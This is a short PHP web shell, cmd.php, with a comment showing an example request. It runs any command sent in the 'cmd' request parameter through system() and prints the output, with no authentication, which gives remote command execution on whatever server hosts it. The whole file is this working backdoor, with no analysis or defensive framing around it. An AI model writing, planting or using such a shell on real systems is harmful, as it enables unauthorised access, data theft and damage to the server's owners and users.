/**
*
*Request like 127.0.0.2:8888/cmd.php?cmd=whoami
*
*/
<?php
if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}
?>
